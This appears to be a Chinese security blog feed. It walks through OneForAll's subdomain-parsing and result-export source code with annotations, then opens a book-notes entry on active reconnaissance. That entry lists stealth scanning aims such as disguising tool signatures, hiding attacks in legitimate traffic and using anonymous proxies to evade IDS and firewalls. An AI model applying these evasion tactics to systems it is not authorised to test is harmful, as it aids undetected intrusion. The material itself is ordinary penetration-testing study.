domain=&#x27;cnn&#x27;, suffix=&#x27;com&#x27;)</span><br><span class="hljs-string">        &gt;&gt;&gt; ext(&#x27;http://forums.bbc.co.uk/&#x27;)</span><br><span class="hljs-string">        ExtractResult(subdomain=&#x27;forums&#x27;, domain=&#x27;bbc&#x27;, suffix=&#x27;co.uk&#x27;)</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        <span class="hljs-comment"># 匹配scheme_chars开头的内容以://结尾的</span><br>        <span class="hljs-comment"># 注：SCHEME_RE = re.compile(r&#x27;^([&#x27; + scheme_chars + &#x27;]+:)?//&#x27;)</span><br>        <span class="hljs-comment"># scheme_chars = (&#x27;abcdefghijklmnopqrstuvwxyz&#x27;&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;&#x27;0123456789&#x27;&#x27;+-.&#x27;)</span><br>        <span class="hljs-comment"># 首先去除://或://开头的内容 提取第一个/前的部分 提取第一个?前的内容 提取第一个#前的内容 提取@分割后的最后一个 提取第一个:前的部分 去除前.后空格</span><br>        netloc = SCHEME_RE.sub(<span class="hljs-string">&quot;&quot;</span>, url) \<br>            .partition(<span class="hljs-string">&quot;/&quot;</span>)[<span class="hljs-number">0</span>] \<br>            .partition(<span class="hljs-string">&quot;?&quot;</span>)[<span class="hljs-number">0</span>] \<br>            .partition(<span class="hljs-string">&quot;#&quot;</span>)[<span class="hljs-number">0</span>] \<br>            .split(<span class="hljs-string">&quot;@&quot;</span>)[-<span class="hljs-number">1</span>] \<br>            .partition(<span class="hljs-string">&quot;:&quot;</span>)[<span class="hljs-number">0</span>] \<br>            .strip() \<br>            .rstrip(<span class="hljs-string">&quot;.&quot;</span>)<br>        <span class="hljs-comment"># 按照.对域名进行分割</span><br>        labels = netloc.split(<span class="hljs-string">&quot;.&quot;</span>)<br>        <span class="hljs-comment"># 跟进源码分析 将分割后的域名逐个添加到translations中</span><br>        translations = [_decode_punycode(label) <span class="hljs-keyword">for</span> label <span class="hljs-keyword">in</span> labels]<br>        <span class="hljs-comment"># 跟进源码 首先读取预备的tlds之后 关于suffix_index，此处应当是返回之后的顶级域名的位置</span><br>        suffix_index = self._get_tld_extractor().suffix_index(translations)<br>        <span class="hljs-comment"># 将后缀全部获取</span><br>        suffix = <span class="hljs-string">&quot;.&quot;</span>.join(labels[suffix_index:])<br>        <span class="hljs-comment"># 如果后缀不存在 且 域名分割数组存在 且 是ip地址</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> suffix <span class="hljs-keyword">and</span> netloc <span class="hljs-keyword">and</span> utils.looks_like_ip(netloc):<br>            <span class="hljs-keyword">return</span> ExtractResult(<span class="hljs-string">&#x27;&#x27;</span>, netloc, <span class="hljs-string">&#x27;&#x27;</span>)<br><br>        subdomain = <span class="hljs-string">&quot;.&quot;</span>.join(labels[:suffix_index - <span class="hljs-number">1</span>]) <span class="hljs-keyword">if</span> suffix_index <span class="hljs-keyword">else</span> <span class="hljs-string">&quot;&quot;</span><br>        domain = labels[suffix_index - <span class="hljs-number">1</span>] <span class="hljs-keyword">if</span> suffix_index <span class="hljs-keyword">else</span> <span class="hljs-string">&quot;&quot;</span><br>        <span class="hljs-keyword">return</span> ExtractResult(subdomain, domain, suffix)<br>    <br>    <br><span class="hljs-comment"># def _decode_punycode</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">_decode_punycode</span>(<span class="hljs-params">label</span>):</span><br>    <span class="hljs-comment"># 转为小写</span><br>    lowered = label.lower()<br>    <span class="hljs-comment"># 判断是否以xn--开头？总感觉是正则匹配中的内容，但是没有查到，经过查询应该是对于国际化域名(Internationalized Domain Name,IDN)又名特殊字符域名的解析</span><br>    looks_like_puny = lowered.startswith(<span class="hljs-string">&#x27;xn--&#x27;</span>)<br>    <span class="hljs-comment"># 如果是则按照IDa编码</span><br>    <span class="hljs-keyword">if</span> looks_like_puny:<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-keyword">return</span> idna.decode(label.encode(<span class="hljs-string">&#x27;ascii&#x27;</span>)).lower()<br>        <span class="hljs-keyword">except</span> (UnicodeError, IndexError):<br>            <span class="hljs-keyword">pass</span><br>    <span class="hljs-keyword">return</span> lowered<br><br><br><span class="hljs-comment"># def _get_tld_extractor</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">_get_tld_extractor</span>(<span class="hljs-params">self</span>):</span><br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    根据本机的信息</span><br><span class="hljs-string">    Get or compute this object&#x27;s TLDExtractor. Looks up the TLDExtractor</span><br><span class="hljs-string">    in roughly the following order, based on the settings passed to</span><br><span class="hljs-string">    __init__:</span><br><span class="hljs-string"></span><br><span class="hljs-string">    1. Memoized on `self`</span><br><span class="hljs-string">    2. Local system cache file</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-comment"># pylint: disable=no-else-return</span><br>    <span class="hljs-comment"># 如果存在_extractor返回</span><br>    <span class="hljs-keyword">if</span> self._extractor:<br>        <span class="hljs-keyword">return</span> self._extractor<br>    <span class="hljs-comment"># 没有则读取文件with open(self.cache_file) as cache_file:return json.loads(cache_file.read())返回内容到tlds</span><br>    tlds = self._get_cached_tlds()<br>    <span class="hljs-keyword">if</span> tlds:<br>        <span class="hljs-comment"># 此处应只是经过了__init__部分：包装这个项目的PSL查找的主要算法，冻结tlds的集合，此后不能再添加或删除任何元素</span><br>        self._extractor = _PublicSuffixListTLDExtractor(tlds)<br>        <span class="hljs-keyword">return</span> self._extractor<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&quot;tlds is empty, cannot proceed without tlds.&quot;</span>)<br>        <br><span class="hljs-comment"># def suffix_index</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">suffix_index</span>(<span class="hljs-params">self, lower_spl</span>):</span><br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    返回第一个后缀标签的索引。</span><br><span class="hljs-string">    如果未找到后缀，则返回len（spl）</span><br><span class="hljs-string">    Returns the index of the first suffix label.</span><br><span class="hljs-string">    Returns len(spl) if no suffix is found</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-comment"># 输入域名的长度</span><br>    length = <span class="hljs-built_in">len</span>(lower_spl)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(length):<br>        <span class="hljs-comment"># 获取可能的顶级域名！！！！ 按照代码运行的结果是比如放入baidu.com 会输出.b.a.i.d.u...c.o.m 完全无法理解，经过代码调试，输入的应该是数组</span><br>        maybe_tld = <span class="hljs-string">&#x27;.&#x27;</span>.join(lower_spl[i:])<br>        <span class="hljs-comment"># 例外的顶级域名？</span><br>        exception_tld = <span class="hljs-string">&#x27;!&#x27;</span> + maybe_tld<br>        <span class="hljs-comment"># 返回从第几个开始后的为顶级域名</span><br>        <span class="hljs-keyword">if</span> exception_tld <span class="hljs-keyword">in</span> self.tlds:<br>            <span class="hljs-keyword">return</span> i + <span class="hljs-number">1</span><br><br>        <span class="hljs-keyword">if</span> maybe_tld <span class="hljs-keyword">in</span> self.tlds:<br>            <span class="hljs-keyword">return</span> i<br>        <span class="hljs-comment"># 相较于maybe只是最开始为*</span><br>        wildcard_tld = <span class="hljs-string">&#x27;*.&#x27;</span> + <span class="hljs-string">&#x27;.&#x27;</span>.join(lower_spl[i + <span class="hljs-number">1</span>:])<br>        <span class="hljs-keyword">if</span> wildcard_tld <span class="hljs-keyword">in</span> self.tlds:<br>            <span class="hljs-keyword">return</span> i<br>    <span class="hljs-comment"># 应该大多数返回的都是长度，可能有一定的理解错误。错！ 返回具体的顶级域名</span><br>    <span class="hljs-keyword">return</span> length<br></code></pre></div></td></tr></table></figure><p>由于之前的部分内容较多切割到下面进行分析</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># class TLDExtract 中的__call__部分</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__call__</span>(<span class="hljs-params">self, url</span>):</span><br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        Takes a string URL and splits it into its subdomain, domain, and</span><br><span class="hljs-string">        suffix (effective TLD, gTLD, ccTLD, etc.) component.</span><br><span class="hljs-string">        获取字符串URL并将其拆分为子域、域和后缀（有效TLD、gTLD、ccTLD等）组件。</span><br><span class="hljs-string">        &gt;&gt;&gt; ext = TLDExtract()</span><br><span class="hljs-string">        &gt;&gt;&gt; ext(&#x27;http://forums.news.cnn.com/&#x27;)</span><br><span class="hljs-string">        ExtractResult(subdomain=&#x27;forums.news&#x27;, domain=&#x27;cnn&#x27;, suffix=&#x27;com&#x27;)</span><br><span class="hljs-string">        &gt;&gt;&gt; ext(&#x27;http://forums.bbc.co.uk/&#x27;)</span><br><span class="hljs-string">        ExtractResult(subdomain=&#x27;forums&#x27;, domain=&#x27;bbc&#x27;, suffix=&#x27;co.uk&#x27;)</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        <span class="hljs-comment"># 匹配scheme_chars开头的内容以://结尾的</span><br>        <span class="hljs-comment"># 注：SCHEME_RE = re.compile(r&#x27;^([&#x27; + scheme_chars + &#x27;]+:)?//&#x27;)</span><br>        <span class="hljs-comment"># scheme_chars = (&#x27;abcdefghijklmnopqrstuvwxyz&#x27;&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;&#x27;0123456789&#x27;&#x27;+-.&#x27;)</span><br>        <span class="hljs-comment"># 首先去除://或://开头的内容 提取第一个/前的部分 提取第一个?前的内容 提取第一个#前的内容 提取@分割后的最后一个 提取第一个:前的部分 去除前后空格</span><br>        netloc = SCHEME_RE.sub(<span class="hljs-string">&quot;&quot;</span>, url) \<br>            .partition(<span class="hljs-string">&quot;/&quot;</span>)[<span class="hljs-number">0</span>] \<br>            .partition(<span class="hljs-string">&quot;?&quot;</span>)[<span class="hljs-number">0</span>] \<br>            .partition(<span class="hljs-string">&quot;#&quot;</span>)[<span class="hljs-number">0</span>] \<br>            .split(<span class="hljs-string">&quot;@&quot;</span>)[-<span class="hljs-number">1</span>] \<br>            .partition(<span class="hljs-string">&quot;:&quot;</span>)[<span class="hljs-number">0</span>] \<br>            .strip() \<br>            .rstrip(<span class="hljs-string">&quot;.&quot;</span>)<br>        <span class="hljs-comment"># 按照.对域名进行分割</span><br>        labels = netloc.split(<span class="hljs-string">&quot;.&quot;</span>)<br>        <span class="hljs-comment"># 跟进源码分析 将域名逐个添加到translations中</span><br>        translations = [_decode_punycode(label) <span class="hljs-keyword">for</span> label <span class="hljs-keyword">in</span> labels]<br>        <span class="hljs-comment"># 跟进源码 首先读取预备的tlds之后 关于suffix_index，此处应当是返回之后的顶级域名的位置</span><br>        suffix_index = self._get_tld_extractor().suffix_index(translations)<br>        <span class="hljs-comment"># 将后缀全部获取</span><br>        suffix = <span class="hljs-string">&quot;.&quot;</span>.join(labels[suffix_index:])<br>        <span class="hljs-comment"># 如果后缀不存在 且 域名分割数组存在 且 是ip地址</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> suffix <span class="hljs-keyword">and</span> netloc <span class="hljs-keyword">and</span> utils.looks_like_ip(netloc):<br>            <span class="hljs-comment"># 由于ip地址会在前面报错，且ip地址搜索子域名不太对的样子，以下代码暂时不分析</span><br>            <span class="hljs-keyword">return</span> ExtractResult(<span class="hljs-string">&#x27;&#x27;</span>, netloc, <span class="hljs-string">&#x27;&#x27;</span>)<br>        <span class="hljs-comment"># 返回0-suffix_index的内容，此处应该是一个子域名头部 在有suffix_index的情况下</span><br>        subdomain = <span class="hljs-string">&quot;.&quot;</span>.join(labels[:suffix_index - <span class="hljs-number">1</span>]) <span class="hljs-keyword">if</span> suffix_index <span class="hljs-keyword">else</span> <span class="hljs-string">&quot;&quot;</span><br>        <span class="hljs-comment"># 返回除后缀的前一个 在有suffix_index的情况下</span><br>        domain = labels[suffix_index - <span class="hljs-number">1</span>] <span class="hljs-keyword">if</span> suffix_index <span class="hljs-keyword">else</span> <span class="hljs-string">&quot;&quot;</span><br>        <span class="hljs-comment"># 带着内容进入对象ExtractResult</span><br>        <span class="hljs-keyword">return</span> ExtractResult(subdomain, domain, suffix)<br><br><span class="hljs-comment"># def looks_like_ip</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">looks_like_ip</span>(<span class="hljs-params">maybe_ip</span>):</span><br>    <span class="hljs-string">&quot;&quot;&quot;Does the given str look like an IP address?&quot;&quot;&quot;</span><br>    <span class="hljs-comment"># 判断数组[0]是否只是由数字组成</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> maybe_ip[<span class="hljs-number">0</span>].isdigit():<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><span class="hljs-comment"># 发现ip地址会卡死在 get_domains函数步骤，想到子域名收集应当是不用ip地址进行查询的。此处只对以下代码进行分析</span><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-comment"># 判断ip地址是否可以连接</span><br>        socket.inet_aton(maybe_ip)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">except</span> (AttributeError, UnicodeError):<br>        <span class="hljs-comment"># 如果不可以连接，用正则表达式进行匹配</span><br>        <span class="hljs-keyword">if</span> IP_RE.match(maybe_ip):<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">except</span> socket.error:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><span class="hljs-comment"># class ExtractResult 此处只粘贴了需要使用的</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ExtractResult</span>(<span class="hljs-params">collections.namedtuple(<span class="hljs-params"><span class="hljs-string">&#x27;ExtractResult&#x27;</span>, <span class="hljs-string">&#x27;subdomain domain suffix&#x27;</span></span>)</span>):</span><br>    <span class="hljs-string">&quot;&quot;&quot;namedtuple of a URL&#x27;s subdomain, domain, and suffix.&quot;&quot;&quot;</span><br><br>    <span class="hljs-comment"># Necessary for __dict__ member to get populated in Python 3+</span><br>    __slots__ = ()<br>    <span class="hljs-comment"># 表示只读，不能修改</span><br><span class="hljs-meta">    @property</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">registered_domain</span>(<span class="hljs-params">self</span>):</span><br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        Joins the domain and suffix fields with a dot, if they&#x27;re both set.</span><br><span class="hljs-string"></span><br><span class="hljs-string">        &gt;&gt;&gt; extract(&#x27;http://forums.bbc.co.uk&#x27;).registered_domain</span><br><span class="hljs-string">        &#x27;bbc.co.uk&#x27;</span><br><span class="hljs-string">        &gt;&gt;&gt; extract(&#x27;http://localhost:8080&#x27;).registered_domain</span><br><span class="hljs-string">        &#x27;&#x27;</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        <span class="hljs-comment"># 如果有domain和suffix则返回组合 此处返回def registered部分</span><br>        <span class="hljs-keyword">if</span> self.domain <span class="hljs-keyword">and</span> self.suffix:<br>            <span class="hljs-keyword">return</span> self.domain + <span class="hljs-string">&#x27;.&#x27;</span> + self.suffix<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span><br></code></pre></div></td></tr></table></figure><p>终于把这部分分析完了，此处做一个思维导图来汇总一下自己的分析流程</p><pre><code class=" mermaid">graph TDrun(run函数)--&gt;|逐个传入domain.eg:www.baidu.com|utils.get_main_domain[utils.get_main_domain]utils.get_main_domain[utils.get_main_domain]--&gt;|返回需要进行搜索的domain.eg:baidu.com|run(run函数)utils.get_main_domain[utils.get_main_domain]--&gt;|传入domain.eg:www.baidu.com|Domian.registered(Domian.registered)Domian.registered(Domian.registered)--&gt;|返回domain.eg:baidu.com|utils.get_main_domain[utils.get_main_domain]Domian.registered(Domian.registered)--&gt;|传入self:大量信息包含domain,tlds文件路径|extract[extract]extract[extract]--&gt;|返回object调用的函数registered_domain:domain+suffix.eg:baidu.com|Domian.registered(Domian.registered)extract(extract)--&gt;|传入suffix_list的路径|tldextract.TLDExtract(tldextract.TLDExtract)tldextract.TLDExtract(tldextract.TLDExtract)--&gt;|返回标准的路径即/home路径|extract(extract)extract(extract)--&gt;|传入标准的domain.|tldextract.TLDExtract.__call__(tldextract.TLDExtract.__call__)tldextract.TLDExtract.__call__(tldextract.TLDExtract.__call__)--&gt;|返回一个包含subdomain:www, domain:baidu, suffix:com的对象|extract(extract)tldextract.TLDExtract.__call__(tldextract.TLDExtract.__call__)--&gt;|传入self|_get_tld_extractor(_get_tld_extractor)_get_tld_extractor(_get_tld_extractor)--&gt;|返回被锁定的域名后缀列表|tldextract.TLDExtract.__call__(tldextract.TLDExtract.__call__)tldextract.TLDExtract.__call__(tldextract.TLDExtract.__call__)--&gt;|传入domain按照.分割后的数组|_get_tld_extractor.suffix_index(_get_tld_extractor.suffix_index)_get_tld_extractor.suffix_index(_get_tld_extractor.suffix_index)--&gt;|返回找到的后缀索引|tldextract.TLDExtract.__call__(tldextract.TLDExtract.__call__)tldextract.TLDExtract.__call__(tldextract.TLDExtract.__call__)--&gt;|传入subdomain:www, domain:baidu, suffix:com|ExtractResult(ExtractResult)ExtractResult(ExtractResult)--&gt;|返回一个object|tldextract.TLDExtract.__call__(tldextract.TLDExtract.__call__)</code></pre><h3 id="5-7-export-all函数"><a href="#5-7-export-all函数" class="headerlink" title="5.7 export_all函数"></a>5.7 export_all函数</h3><p>对于之后的main函数放置到下一部分，将mian函数之后的内容进行分析</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># 如果查询的是多个域名</span><br><span class="hljs-keyword">if</span> count &gt; <span class="hljs-number">1</span>:<br>    <span class="hljs-comment"># 存储内容还不清楚具体各个参数的含义，分析main函数后进一步解析</span><br>    utils.export_all(self.alive, self.fmt, self.path, self.datas)<br></code></pre></div></td></tr></table></figure><h4 id="5-7-1-export-all函数"><a href="#5-7-1-export-all函数" class="headerlink" title="5.7.1 export_all函数"></a>5.7.1 export_all函数</h4><p>结果导出函数</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">export_all</span>(<span class="hljs-params">alive, fmt, path, datas</span>):</span><br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    将所有结果数据导出</span><br><span class="hljs-string"></span><br><span class="hljs-string">    :param bool alive: 只导出存活子域结果</span><br><span class="hljs-string">    :param str fmt: 导出文件格式</span><br><span class="hljs-string">    :param str path: 导出文件路径</span><br><span class="hljs-string">    :param list datas: 待导出的结果数据</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-comment"># 检查导出的格式是否是json或csv</span><br>    fmt = check_format(fmt)<br>    <span class="hljs-comment"># 获取输出时间</span><br>    timestamp = get_timestring()<br>    <br>    name = <span class="hljs-string">f&#x27;all_subdomain_result_<span class="hljs-subst">&#123;timestamp&#125;</span>&#x27;</span><br>    <span class="hljs-comment"># </span><br>    export_all_results(path, name, fmt, datas)<br>    export_all_subdomains(alive, path, name, datas)<br></code></pre></div></td></tr></table></figure><h4 id="5-7-2-export-all-results和export-all-subdomains函数"><a href="#5-7-2-export-all-results和export-all-subdomains函数" class="headerlink" title="5.7.2 export_all_results和export_all_subdomains函数"></a>5.7.2 export_all_results和export_all_subdomains函数</h4><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># def export_all_results</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">export_all_results</span>(<span class="hljs-params">path, name, fmt, datas</span>):</span><br>    <span class="hljs-comment"># 检查保存路径的正确 此处不进一步分析</span><br>    path = check_path(path, name, fmt)<br>    logger.log(<span class="hljs-string">&#x27;ALERT&#x27;</span>, <span class="hljs-string">f&#x27;The subdomain result for all main domains: <span class="hljs-subst">&#123;path&#125;</span>&#x27;</span>)<br>    row_list = <span class="hljs-built_in">list</span>()<br>    <span class="hljs-keyword">for</span> row <span class="hljs-keyword">in</span> datas:<br>        <span class="hljs-comment"># 判断是第一行的时候的处理</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;header&#x27;</span> <span class="hljs-keyword">in</span> row:<br>            row.pop(<span class="hljs-string">&#x27;header&#x27;</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;response&#x27;</span> <span class="hljs-keyword">in</span> row:<br>            row.pop(<span class="hljs-string">&#x27;response&#x27;</span>)<br>        <span class="hljs-comment"># 赋值</span><br>        keys = row.keys()<br>        values = row.values()<br>        <span class="hljs-comment"># 添加到row_list中，此处的class Record的作用是判断两者是否长度匹配</span><br>        row_list.append(Record(keys, values))<br>    <span class="hljs-comment"># 此处初始化了对象</span><br>    rows = RecordCollection(<span class="hljs-built_in">iter</span>(row_list))<br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">def export(self, format, **kwargs):</span><br><span class="hljs-string">    #Export the RecordCollection to a given format (courtesy of Tablib).</span><br><span class="hljs-string">    将RecordCollection导出为给定格式 Tablib实现</span><br><span class="hljs-string">    return self.dataset.export(format, **kwargs)</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>    content = rows.export(fmt)<br>    <span class="hljs-comment"># 保存到文件中</span><br>    save_to_file(path, content)<br></code></pre></div></td></tr></table></figure><p>export_all_subdomains部分</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># def export_all_subdomains</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">export_all_subdomains</span>(<span class="hljs-params">alive, path, name, datas</span>):</span><br>    <span class="hljs-comment"># 检查路径</span><br>    path = check_path(path, name, <span class="hljs-string">&#x27;txt&#x27;</span>)<br>    logger.log(<span class="hljs-string">&#x27;ALERT&#x27;</span>, <span class="hljs-string">f&#x27;The txt subdomain result for all main domains: <span class="hljs-subst">&#123;path&#125;</span>&#x27;</span>)<br>    subdomains = <span class="hljs-built_in">set</span>()<br>    <span class="hljs-comment"># 逐个读取内容</span><br>    <span class="hljs-keyword">for</span> row <span class="hljs-keyword">in</span> datas:<br>        subdomain = row.get(<span class="hljs-string">&#x27;subdomain&#x27;</span>)<br>        <span class="hljs-comment"># 如果alive存在</span><br>        <span class="hljs-keyword">if</span> alive:<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> row.get(<span class="hljs-string">&#x27;alive&#x27;</span>):<br>                <span class="hljs-keyword">continue</span><br>            subdomains.add(subdomain)<br>        <span class="hljs-keyword">else</span>:<br>            subdomains.add(subdomain)<br>    data = <span class="hljs-string">&#x27;\n&#x27;</span>.join(subdomains)<br>    <span class="hljs-comment"># 保存文件</span><br>    save_to_file(path, data)<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>信安 工具分析 OneForAll</category>
      
    </categories>
    
    
    <tags>
      
      <tag>python</tag>
      
      <tag>工具分析</tag>
      
      <tag>OneForAll</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>信息收集-主动侦察</title>
    <link href="/2021/08/27/%E4%B9%A6%E7%B1%8D/Kali%E9%AB%98%E7%BA%A7%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E4%B8%BB%E5%8A%A8%E4%BE%A6%E5%AF%9F/"/>
    <url>/2021/08/27/%E4%B9%A6%E7%B1%8D/Kali%E9%AB%98%E7%BA%A7%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E4%B8%BB%E5%8A%A8%E4%BE%A6%E5%AF%9F/</url>
    
    <content type="html"><![CDATA[<h1 id="信息收集-主动侦察"><a href="#信息收集-主动侦察" class="headerlink" title="信息收集-主动侦察"></a>信息收集-主动侦察</h1><h1 id="1-外网与内网的主动侦察"><a href="#1-外网与内网的主动侦察" class="headerlink" title="1. 外网与内网的主动侦察"></a>1. 外网与内网的主动侦察</h1><p>主动侦察会产生更多更有用的信息，但是，由于与目标系统的交互可能会被记录，并且可能会通过防火墙、入侵检测系统（IDS）、入侵阻止系统（IPS）等防护设施触发报警。当对攻击者有用的数据增加时，被检测到的风险同样增加</p><p>为了提高提供详细的主动侦察信息的有效性，我们的重点是使用隐形的、不易察觉的技术</p><p>在本章中，将学习：</p><ul><li>秘密扫描策略</li><li>外部和内部设施、主机发现和枚举</li><li>应用程序的综合侦察，特别是recon-ng</li><li>使用DHCP枚举内部主机</li><li>渗透测试时有用的Microsoft Windows命令</li><li>利用默认配置的优势</li><li>利用SNMP、SMB和rpcclient枚举用户</li></ul><p><img src="https://res.weread.qq.com/wrepub/epub_33211566_85" alt="威胁情报与风险关系图"></p><h2 id="1-1-秘密扫描策略"><a href="#1-1-秘密扫描策略" class="headerlink" title="1.1 秘密扫描策略"></a>1.1 秘密扫描策略</h2><p>被目标发现是主动侦察的最大风险。使用测试人员的时间、数据戳、源IP地址及其他附加信息，目标可能识别出侵入侦察的来源。因此，采用隐形技术，可以将被发现的概率降到最低</p><p>使用隐形技术侦察，需要做到以下几点：</p><ul><li>伪装工具签名来逃避检查和触发警报</li><li>将攻击隐藏于合法流量中</li><li>修改攻击，隐藏其流量的来源和类型</li><li>使用非标准的流量类型或加密来使攻击隐形</li></ul><p>私密扫描技术包括以下方面：</p><ul><li>调整源IP栈和工具识别设置</li><li>修改数据包参数</li><li>使用匿名网络代理</li></ul><h3 id="1-1-1-调整源IP栈和工具识别设置"><a href="#1-1-1-调整源IP栈和工具识别设置" class="headerlink" title="1.1.1 调整源IP栈和工具识别设置"></a>1.1.1 